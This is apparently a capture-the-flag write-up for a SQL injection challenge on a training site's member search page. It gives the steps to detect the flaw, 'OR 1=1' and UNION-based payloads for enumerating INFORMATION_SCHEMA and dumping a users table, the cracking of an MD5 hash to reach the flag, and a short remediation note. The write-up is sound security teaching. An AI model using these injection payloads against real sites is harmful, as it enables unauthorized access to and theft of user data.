
# SQL Injection - Member

## Context summary
The section of the site provides us with a member search tool, we can suppose to enter a number or string which serves as a unique identifier.

## Vulnerability
This site is seriously vulnerable to SQL injections.

## Attack Design

### How to detect SQL injection vulnerabilities ?
We can try a very basic test, which is to insert a quote in the input.

`http://[IP_ADDR]/?page=member&id=123&Submit=Submit#`
```sql
SELECT something, random FROM users WHERE id = 123
```

If in this case you replace **123** input with a `'`, it will give you a syntax error because of the impair number of quotes, and in this case you can conclude that you can inject SQL.

`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1`

Meaning that the query become something like that :

```sql
SELECT something, random FROM users WHERE id = '
```

###  SQL Injection Based on 1=1 is Always True

```sql
# Always true
OR 1=1;
```
```sql
SELECT something, random FROM users WHERE id = 123 OR 1=1;
```

You will quickly understand, if in the input we now put **`1 OR 1=1;`** , we will return all the selected columns.
We get some data, but not that interesting, so we'll send a query on a much larger scale using **UNION**.

###  SQL Injection Attack Based on UNION

The **`UNION`** operator is used to combine the result-set of two or more **`SELECT`** statements.

- Every **`SELECT`** statement within **`UNION`** must have the same number of columns
- The columns must also have similar data types
- The columns in every **`SELECT`** statement must also be in the same order

To respect the first condition we will do a series of tests manually, we have to determine how many columns are being returned from the original query.
```sql
UNION SELECT NULL--
UNION SELECT NULL, NULL--
UNION SELECT NULL, NULL, NULL--
```
In our case it will be two columns.


To carry out a query on a larger scale I chose the [INFORMATION_SCHEMA.COLUMNS](https://www.mssqltips.com/sqlservertutorial/183/information-schema-columns/)

```sql
SELECT something, random FROM users WHERE id = 123 OR 1=1
UNION
SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
```

Now we can see that in the return of this query, we have at the very end some interesting data which is linked to the user table, in order to read everything at once, we can use a SQL Function **`CONCAT()`**.

```sql
SELECT something, random FROM users WHERE id = 123 OR 1=1
UNION
SELECT user_id, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
```

Now we still have a certain password to decipher
```
5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```

`5ff9d0165b4f92b14994e5c685cdce28` : **FortyTwo**. (was MD5).  
**FortyTwo** -> **fortytwo** -> `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Remediation
The following security measures are the most effective way to prevent SQL injection attacks: Using prepared statements and parameterized queries.

> Flag : `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
